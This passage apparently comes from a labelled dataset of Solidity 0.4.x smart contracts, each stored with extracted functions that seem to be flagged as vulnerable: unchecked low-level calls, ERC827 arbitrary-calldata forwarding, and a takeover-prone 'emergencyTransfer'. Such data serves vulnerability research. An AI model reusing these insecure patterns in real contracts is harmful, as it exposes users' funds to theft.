  "content": "pragma solidity ^0.4.18;\ncontract ABC {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'ABCv1.0';\n address public owner;\n uint256 public totalSupply;\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event FrozenFunds(address indexed _target, bool _frozen);\n function ABC(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n owner = msg.sender;\n transfer(msg.sender, _initialAmount);\n }\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(frozenAccount[msg.sender] != true && frozenAccount[_to] != true);\n require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(frozenAccount[_from] != true && frozenAccount[_to] != true);\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]);\n uint256 allowance = allowed[_from][msg.sender];\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n emit Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n require(frozenAccount[_spender] != true);\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n require(frozenAccount[_spender] != true);\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function issueNew(uint256 _issueQty) public returns (bool success) {\n require(msg.sender == owner);\n balances[owner] += _issueQty;\n totalSupply += _issueQty;\n emit Transfer(msg.sender, owner, _issueQty);\n return true;\n }\n function vanishToken( uint256 _vanishQty ) public returns (bool success) {\n require(msg.sender == owner);\n require(balances[owner] >= _vanishQty);\n balances[owner] -= _vanishQty;\n totalSupply -= _vanishQty;\n emit Transfer(msg.sender, owner, _vanishQty);\n return true;\n }\n function freezeAccount(address _target, bool _freeze) public returns (bool success) {\n require(msg.sender == owner);\n frozenAccount[_target] = _freeze;\n emit FrozenFunds(_target, _freeze);\n return true;\n }\n function transferOwnership(address _newOwner) public returns (bool success) {\n require(msg.sender == owner);\n owner = _newOwner;\n return true;\n }\n mapping (address => bool) public frozenAccount;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nrequire(frozenAccount[_spender] != true);\nallowed[msg.sender][_spender] = _value;\nemit Approval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144e"
  },
  "filename": "21999.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Owned {\n address owner;\n function Owned() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n if (msg.sender != owner)\n revert();\n _;\n }\n}\ncontract WalletWithEmergencyTransfer is Owned {\n event Deposit(address from, uint amount);\n event Withdrawal(address from, uint amount);\n event Call(address from, address to, uint amount);\n address public owner = msg.sender;\n uint256 private emergencyCode;\n uint256 private emergencyAmount;\n function WalletWithEmergencyTransfer() public {\n }\n function() public payable {\n deposit();\n }\n function deposit() public payable {\n require(msg.value > 0);\n Deposit(msg.sender, msg.value);\n }\n function withdraw(uint amount) public onlyOwner {\n require(amount <= this.balance);\n msg.sender.transfer(amount);\n Withdrawal(msg.sender, amount);\n }\n function call(address addr, bytes data, uint256 amount) public payable onlyOwner {\n if (msg.value > 0)\n deposit();\n require(addr.call.value(amount)(data));\n Call(msg.sender, addr, amount);\n }\n function setEmergencySecrets(uint256 code, uint256 amount) public onlyOwner {\n emergencyCode = code;\n emergencyAmount = amount;\n }\n function emergencyTransfer(uint256 code, address newOwner) public payable {\n if ((code == emergencyCode) &&\n (msg.value == emergencyAmount) &&\n (newOwner != address(0))) {\n owner = msg.sender;\n }\n }\n}",
  "extract_feature": [
    "function call(address addr, bytes data, uint256 amount) public payable onlyOwner {\nif (msg.value > 0)\ndeposit();\nrequire(addr.call.value(amount)(data));\nCall(msg.sender, addr, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb144f"
  },
  "filename": "222.sol",
  "content": "pragma solidity ^0.4.19;\ncontract WETH_0x {\n function balanceOf(address userAddress) public view returns (uint);\n}\ncontract Token {\n function balanceOf(address tokenOwner) public view returns (uint );\n function transfer(address toAddress, uint tokens) public returns (bool );\n function allowance(address _owner, address _spender) constant returns (uint );\n}\ncontract BalanceCheckerN {\n address public admin;\n constructor() {\n admin = 0x96670A91E1A0dbAde97fCDC0ABdDEe769C21fc8e;\n }\n function() public payable {\n revert();\n }\n modifier isAdmin() {\n require(msg.sender == admin);\n _;\n }\n function destruct() public isAdmin {\n selfdestruct(admin);\n }\n function withdraw() public isAdmin {\n admin.transfer(address(this).balance);\n }\n function withdrawToken(address token, uint amount) public isAdmin {\n require(token != address(0x0));\n require(Token(token).transfer(msg.sender, amount));\n }\n function tokenAllowance(address user, address spender, address token) public view returns (uint) {\n uint256 tokenCode;\n assembly { tokenCode := extcodesize(token) }\n if(tokenCode > 0)\n {\n Token tok = Token(token);\n if(address(tok).call(bytes4(keccak256(\"allowance(address,address)\")), user, spender)) {\n return tok.allowance(user, spender);\n } else {\n return 0;\n }\n } else {\n return 0;\n }\n }\n function tokenBalance(address user, address token) public view returns (uint) {\n uint256 tokenCode;\n assembly { tokenCode := extcodesize(token) }\n if(tokenCode > 0)\n {\n Token tok = Token(token);\n if(address(tok).call(bytes4(keccak256(\"balanceOf(address)\")), user)) {\n return tok.balanceOf(user);\n } else {\n return 0;\n }\n } else {\n return 0;\n }\n }\n function walletBalances(address user, address[] tokens) public view returns (uint[]) {\n require(tokens.length > 0);\n uint[] memory balances = new uint[](tokens.length);\n for(uint i = 0; i< tokens.length; i++){\n if( tokens[i] != address(0x0) ) {\n balances[i] = tokenBalance(user, tokens[i]);\n }\n else {\n balances[i] = user.balance;\n }\n }\n return balances;\n }\n function walletAllowances(address user, address spender, address[] tokens) public view returns (uint[]) {\n require(tokens.length > 0);\n uint[] memory allowances = new uint[](tokens.length);\n for(uint i = 0; i< tokens.length; i++){\n allowances[i] = tokenAllowance(user, spender, tokens[i]);\n }\n return allowances;\n }\n function allAllowancesForManyAccounts(\n address[] users,\n address spender,\n address[] tokens)\n public view returns (uint[]) {\n uint[] memory allowances = new uint[](tokens.length * users.length);\n for(uint user = 0; user < users.length; user++){\n for(uint token = 0; token < tokens.length; token++) {\n allowances[(user * tokens.length) + token] = tokenAllowance(users[user], spender, tokens[token]);\n }\n }\n return allowances;\n }\n function allBalancesForManyAccounts(\n address[] users,\n address[] tokens)\n public view returns (uint[]) {\n uint[] memory balances = new uint[](tokens.length * users.length);\n for(uint user = 0; user < users.length; user++){\n for(uint token = 0; token < tokens.length; token++){\n if( tokens[token] != address(0x0) ) {\n balances[(user * tokens.length) + token] = tokenBalance(users[user], tokens[token]);\n } else {\n balances[(user * tokens.length) + token] = users[user].balance;\n }\n }\n }\n return balances;\n }\n function allWETHbalances(\n address wethAddress,\n address[] users\n ) public view returns (uint[]) {\n WETH_0x weth = WETH_0x(wethAddress);\n uint[] memory balances = new uint[](users.length);\n for(uint k = 0; k < users.length; k++){\n balances[k] = weth.balanceOf(users[k]);\n }\n return balances;\n }\n}",
  "extract_feature": [
    "function tokenAllowance(address user, address spender, address token) public view returns (uint) {\nuint256 tokenCode;\nassembly { tokenCode := extcodesize(token) }\nif(tokenCode > 0)\n{\nToken tok = Token(token);\nif(address(tok).call(bytes4(keccak256(\"allowance(address,address)\")), user, spender)) {\nreturn tok.allowance(user, spender);\n} else {\nreturn 0;\n}\n} else {\nreturn 0;\n}\n}",
    "function tokenBalance(address user, address token) public view returns (uint) {\nuint256 tokenCode;\nassembly { tokenCode := extcodesize(token) }\nif(tokenCode > 0)\n{\nToken tok = Token(token);\nif(address(tok).call(bytes4(keccak256(\"balanceOf(address)\")), user)) {\nreturn tok.balanceOf(user);\n} else {\nreturn 0;\n}\n} else {\nreturn 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1450"
  },
  "filename": "22474.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract Ownable {\n address public owner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = true;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract PausableToken is ERC827Token, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n function transfer(address _to, uint256 _value, bytes _data) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value, _data);\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n return super.transferFrom(_from, _to, _value, _data);\n }\n function approve(address _spender, uint256 _value, bytes _data) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value, _data);\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public whenNotPaused returns (bool) {\n return super.increaseApproval(_spender, _addedValue, _data);\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public whenNotPaused returns (bool) {\n return super.decreaseApproval(_spender, _subtractedValue, _data);\n }\n}\ncontract MintableToken is PausableToken {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract AirEX is MintableToken {\n string public constant name = \"AIRX\";\n string public constant symbol = \"AIRX\";\n uint8 public constant decimals = 18;\n uint256 public hardCap;\n uint256 public softCap;\n function AirEX(uint256 _cap) public {\n require(_cap > 0);\n hardCap = _cap;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n require(totalSupply_.add(_amount) <= hardCap);\n return super.mint(_to, _amount);\n }\n function updateHardCap(uint256 _cap) onlyOwner public {\n require(_cap > 0);\n hardCap = _cap;\n }\n function updateSoftCap(uint256 _cap) onlyOwner public {\n require(_cap > 0);\n softCap = _cap;\n }\n}\ncontract SalesManagerUpgradable is Ownable {\n using SafeMath for uint256;\n address public ethOwner = 0xe8290a10565CB7aDeE9246661B34BB77CB6e4024;\n uint public price1 = 100;\n uint public price2 = 110;\n uint public price3 = 125;\n uint public lev1 = 2 ether;\n uint public lev2 = 10 ether;\n uint public ethFundRaised;\n address public tokenAddress;\n function SalesManagerUpgradable () public {\n tokenAddress = new AirEX(5550000 ether);\n }\n function () payable public {\n if(msg.value > 0) revert();\n }\n function buyTokens(address _investor) public payable returns (bool){\n if (msg.value <= lev1) {\n uint tokens = msg.value.mul(price1);\n if (!sendTokens(tokens, msg.value, _investor)) revert();\n return true;\n } else if (msg.value > lev1 && msg.value <= lev2) {\n tokens = msg.value.mul(price2);\n if (!sendTokens(tokens, msg.value, _investor)) revert();\n return true;\n } else if (msg.value > lev2) {\n tokens = msg.value.mul(price3);\n if (!sendTokens(tokens, msg.value, _investor)) revert();\n return true;\n }\n return false;\n }\n function sendTokens(uint _amount, uint _ethers, address _investor) private returns (bool) {\n AirEX tokenHolder = AirEX(tokenAddress);\n if (tokenHolder.mint(_investor, _amount)) {\n ethFundRaised = ethFundRaised.add(_ethers);\n ethOwner.transfer(_ethers);\n return true;\n }\n return false;\n }\n function generateTokensManually(uint _amount, address _to) public onlyOwner {\n AirEX tokenHolder = AirEX(tokenAddress);\n tokenHolder.mint(_to, _amount);\n }\n function setColdAddress(address _newAddr) public onlyOwner {\n ethOwner = _newAddr;\n }\n function setPrice1 (uint _price) public onlyOwner {\n price1 = _price;\n }\n function setPrice2 (uint _price) public onlyOwner {\n price2 = _price;\n }\n function setPrice3 (uint _price) public onlyOwner {\n price3 = _price;\n }\n function setLev1 (uint _price) public onlyOwner {\n lev1 = _price;\n }\n function setLev2 (uint _price) public onlyOwner {\n lev2 = _price;\n }\n function transferOwnershipToken(address newTokenOwnerAddress) public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.transferOwnership(newTokenOwnerAddress);\n }\n function updateHardCap(uint256 _cap) public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.updateHardCap(_cap);\n }\n function updateSoftCap(uint256 _cap) public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.updateSoftCap(_cap);\n }\n function unPauseContract() public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.unpause();\n }\n function pauseContract() public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.pause();\n }\n function finishMinting() public onlyOwner {\n AirEX tokenContract = AirEX(tokenAddress);\n tokenContract.finishMinting();\n }\n function drop(address[] _destinations, uint256[] _amount) onlyOwner public\n returns (uint) {\n uint i = 0;\n while (i < _destinations.length) {\n AirEX(tokenAddress).mint(_destinations[i], _amount[i]);\n i += 1;\n }\n return(i);\n }\n function withdraw(address _to) public onlyOwner {\n _to.transfer(this.balance);\n }\n function destroySalesManager(address _recipient) public onlyOwner {\n selfdestruct(_recipient);\n }\n}\ncontract DepositManager is Ownable {\n address public actualSalesAddress;\n function DepositManager (address _actualAddres) public {\n actualSalesAddress = _actualAddres;\n }\n function () payable public {\n SalesManagerUpgradable sm = SalesManagerUpgradable(actualSalesAddress);\n if(!sm.buyTokens.value(msg.value)(msg.sender)) revert();\n }\n function setNewSalesManager (address _newAddr) public onlyOwner {\n actualSalesAddress = _newAddr;\n }\n}",
  "extract_feature": [
    "function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.approve(_spender, _value);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transfer(_to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\nrequire(_to != address(this));\nsuper.transferFrom(_from, _to, _value);\nrequire(_to.call(_data));\nreturn true;\n}",
    "function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.increaseApproval(_spender, _addedValue);\nrequire(_spender.call(_data));\nreturn true;\n}",
    "function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\nrequire(_spender != address(this));\nsuper.decreaseApproval(_spender, _subtractedValue);\nrequire(_spender.call(_data));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1451"
  },
  "filename": "22572.sol",
  "content": "pragma solidity ^0.4.21;\ncontract Exchange {\n function balanceOf(address , address ) public view returns (uint);\n}\ncontract Token {\n function balanceOf(address ) public view returns (uint );\n function transfer(address , uint ) public returns (bool );\n}\ncontract DeltaBalances {\n address public admin;\n function DeltaBalances() public {\n admin = msg.sender;\n }\n function() public payable {\n revert();\n }\n modifier isAdmin() {\n require(msg.sender == admin);\n _;\n }\n function withdraw() external isAdmin {\n admin.transfer(address(this).balance);\n }\n function withdrawToken(address token, uint amount) external isAdmin {\n require(token != address(0x0) && Token(token).transfer(msg.sender, amount));\n }\n function deltaBalances(address exchange, address user, address[] tokens) external view returns (uint[]) {\n Exchange ex = Exchange(exchange);\n uint[] memory balances = new uint[](tokens.length);\n for(uint i = 0; i < tokens.length; i++) {\n balances[i] = ex.balanceOf(tokens[i], user);\n }\n return balances;\n }\n function multiDeltaBalances(address[] exchanges, address user, address[] tokens) external view returns (uint[]) {\n uint[] memory balances = new uint[](tokens.length * exchanges.length);\n for(uint i = 0; i < exchanges.length; i++) {\n Exchange ex = Exchange(exchanges[i]);\n for(uint j = 0; j < tokens.length; j++) {\n balances[(j * exchanges.length) + i] = ex.balanceOf(tokens[j], user);\n }\n }\n return balances;\n }\n function tokenBalance(address user, address token) public view returns (uint) {\n uint256 tokenCode;\n assembly { tokenCode := extcodesize(token) }\n if(tokenCode > 0 && token.call(bytes4(keccak256(\"balanceOf(address)\")), user)) {\n return Token(token).balanceOf(user);\n } else {\n return 0;\n }\n }\n function walletBalances(address user, address[] tokens) external view returns (uint[]) {\n require(tokens.length > 0);\n uint[] memory balances = new uint[](tokens.length);\n for(uint i = 0; i < tokens.length; i++) {\n if(tokens[i] != address(0x0)) {\n balances[i] = tokenBalance(user, tokens[i]);\n } else {\n balances[i] = user.balance;\n }\n }\n return balances;\n }\n function allBalances(address exchange, address user, address[] tokens) external view returns (uint[]) {\n Exchange ex = Exchange(exchange);\n uint[] memory balances = new uint[](tokens.length * 2);\n for(uint i = 0; i < tokens.length; i++) {\n uint j = i * 2;\n balances[j] = ex.balanceOf(tokens[i], user);\n if(tokens[i] != address(0x0)) {\n balances[j + 1] = tokenBalance(user, tokens[i]);\n } else {\n balances[j + 1] = user.balance;\n }\n }\n return balances;\n }\n}",
  "extract_feature": [
    "function tokenBalance(address user, address token) public view returns (uint) {\nuint256 tokenCode;\nassembly { tokenCode := extcodesize(token) }\nif(tokenCode > 0 && token.call(bytes4(keccak256(\"balanceOf(address)\")), user)) {\nreturn Token(token).balanceOf(user);\n} else {\nreturn 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1452"
  },
  "filename": "22608.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Caller {\n function EFOcallBack(string _response);\n}\ncontract EthernityFinancialOracle{\n address public owner;\n address public oracleAddress;\n uint public collectedFee;\n uint public feePrice = 0.0005 ether;\n uint public gasLimit = 50000;\n uint public gasPrice = 40000000000 wei;\n struct User {\n string response;\n bool callBack;\n bool asked;\n uint balance;\n bool banned;\n }\n mapping(address => User) public users;\n modifier onlyOwner{\n require(msg.sender == owner);\n _;\n }\n modifier onlyOracle{\n require(msg.sender == oracleAddress);\n _;\n }\n modifier onlyOwnerOrOracle {\n require(msg.sender == owner || msg.sender == oracleAddress);\n _;\n }\n modifier notBanned {\n require( users[msg.sender].banned == false );\n _;\n }\n modifier receivePayment {\n users[msg.sender].balance = users[msg.sender].balance + msg.value;\n _;\n }\n event Request (string _coin , string _againstCoin , address _address , uint _gasPrice , uint _gasLimit );\n event Response (address _address , string _response);\n event Error (string _error);\n function EthernityFinancialOracle() {\n owner = msg.sender;\n oracleAddress = msg.sender;\n }\n function () payable receivePayment {\n }\n function requestEtherToUSD(bool _callBack , uint _gasPrice , uint _gasLimit) payable receivePayment notBanned {\n (_gasPrice , _gasLimit) = payToOracle (_gasPrice , _gasLimit);\n users[msg.sender].callBack = _callBack;\n users[msg.sender].asked = true;\n Request ('ETH', 'USD', msg.sender , _gasPrice , _gasLimit );\n }\n function requestCoinToUSD(string _coin , bool _callBack , uint _gasPrice , uint _gasLimit) payable receivePayment notBanned {\n (_gasPrice , _gasLimit) = payToOracle (_gasPrice , _gasLimit);\n users[msg.sender].callBack = _callBack;\n users[msg.sender].asked = true;\n Request (_coin, 'USD', msg.sender , _gasPrice , _gasLimit );\n }\n function requestRate(string _coin, string _againstCoin , bool _callBack , uint _gasPrice , uint _gasLimit) payable receivePayment notBanned {\n (_gasPrice , _gasLimit) = payToOracle (_gasPrice , _gasLimit);\n users[msg.sender].callBack = _callBack;\n users[msg.sender].asked = true;\n Request (_coin, _againstCoin, msg.sender , _gasPrice , _gasLimit );\n }\n function getRefund() {\n if (msg.sender == owner) {\n uint a = collectedFee;\n collectedFee = 0;\n require(owner.send(a));\n } else {\n uint b = users[msg.sender].balance;\n users[msg.sender].balance = 0;\n require(msg.sender.send(b));\n }\n }\n function getResponse() public constant returns(string _response){\n return users[msg.sender].response;\n }\n function getPrice(uint _gasPrice , uint _gasLimit) public constant returns(uint _price) {\n if (_gasPrice == 0) _gasPrice = gasPrice;\n if (_gasLimit == 0) _gasLimit = gasLimit;\n assert(_gasLimit * _gasPrice / _gasLimit == _gasPrice);\n return feePrice + _gasLimit * _gasPrice;\n }\n function getBalance() public constant returns(uint _balance) {\n return users[msg.sender].balance;\n }\n function getBalance(address _address) public constant returns(uint _balance) {\n return users[_address].balance;\n }\n function setResponse (address _user, string _result) onlyOracle {\n require( users[_user].asked );\n users[_user].asked = false;\n if ( users[_user].callBack ) {\n Caller _caller = Caller(_user);\n _caller.EFOcallBack(_result);\n } else {\n users[_user].response = _result;\n Response( _user , _result );\n }\n }\n function payToOracle (uint _gasPrice , uint _gasLimit) internal returns(uint _price , uint _limit) {\n if (_gasPrice == 0) _gasPrice = gasPrice;\n if (_gasLimit == 0) _gasLimit = gasLimit;\n uint gp = getPrice(_gasPrice,_gasLimit);\n require (users[msg.sender].balance >= gp );\n collectedFee += feePrice;\n users[msg.sender].balance -= gp;\n require(oracleAddress.send(gp - feePrice));\n return(_gasPrice,_gasLimit);\n }\n function changeOwner(address _newOwner) onlyOwner {\n owner = _newOwner;\n }\n function changeOracleAdd(address _newOracleAdd) onlyOwner {\n oracleAddress = _newOracleAdd;\n }\n function setFeePrice(uint _feePrice) onlyOwner {\n feePrice = _feePrice;\n }\n function setGasPrice(uint _gasPrice) onlyOwnerOrOracle {\n gasPrice = _gasPrice;\n }\n function setGasLimit(uint _gasLimit) onlyOwnerOrOracle {\n gasLimit = _gasLimit;\n }\n function emergencyFlush() onlyOwner {\n require(owner.send(this.balance));\n }\n function ban(address _user) onlyOwner{\n users[_user].banned = true;\n }\n function desBan(address _user) onlyOwner{\n users[_user].banned = false;\n }\n}",
  "extract_feature": [
    "function getRefund() {\nif (msg.sender == owner) {\nuint a = collectedFee;\ncollectedFee = 0;\nrequire(owner.send(a));\n} else {\nuint b = users[msg.sender].balance;\nusers[msg.sender].balance = 0;\nrequire(msg.sender.send(b));\n}\n}",
    "function payToOracle (uint _gasPrice , uint _gasLimit) internal returns(uint _price , uint _limit) {\nif (_gasPrice == 0) _gasPrice = gasPrice;\nif (_gasLimit == 0) _gasLimit = gasLimit;\nuint gp = getPrice(_gasPrice,_gasLimit);\nrequire (users[msg.sender].balance >= gp );\ncollectedFee += feePrice;\nusers[msg.sender].balance -= gp;\nrequire(oracleAddress.send(gp - feePrice));\nreturn(_gasPrice,_gasLimit);\n}",
    "function emergencyFlush() onlyOwner {\nrequire(owner.send(this.balance));\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1453"
  },
  "filename": "22635.sol",
  "content": "pragma solidity ^0.4.20;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n 